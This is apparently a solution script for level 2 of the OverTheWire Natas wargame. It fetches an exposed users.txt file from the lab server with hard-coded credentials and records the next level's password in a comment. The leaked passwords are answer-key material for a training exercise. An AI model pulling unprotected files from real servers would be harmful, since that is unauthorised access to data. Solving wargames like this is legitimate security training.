#!/usr/bin/python3

import requests

# from the source file we are able to determine the file system structure
# of the server. we can also take a peek at the users.txt file from 
# a browser search bar
url = "http://natas2.natas.labs.overthewire.org/files/users.txt"
auth = ('natas2', 'h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7')


r = requests.get(url=url, auth=auth)
print(r.text)

# password = G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
